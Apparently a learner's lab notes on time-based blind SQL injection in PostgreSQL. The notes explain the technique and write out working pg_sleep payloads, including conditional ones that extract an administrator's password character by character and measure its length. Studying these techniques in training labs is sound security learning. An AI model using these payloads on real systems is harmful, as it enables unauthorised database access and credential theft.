ðŸ§  What is it?
Sometimes:

You're injecting into a SQL query.

But you donâ€™t get any errors, and

You donâ€™t see any data coming back either.

So how do you know if your injection is working?

ðŸ’¡ The answer: make the database pause ("sleep") when your condition is true.
If the website takes longer to respond, it means your condition is correct.

This is called time-based blind SQL injection.


RESULT PAYLOAD
'|| (select pg_sleep(10))--
WHY and is not used ? because it expects a boolean value but sleep returns void value

NEXT LAB FIND ADMIN ID AND PASS

PAYLOAD
'|| (select pg_sleep(10))--

Conditional time delays Default PAYLOAD POSTGRESQL
This is answer payload
' || (SELECT CASE WHEN (substring((select password from users where username='administrator'),1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END)--

' || (SELECT CASE WHEN (substring((select password from users where username='administrator'),1,1)>'a') THEN pg_sleep(10) ELSE pg_sleep(0) END)--
' || (SELECT CASE WHEN (LENGTH((select password from users where username='administrator'))>1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--
Password length is 20
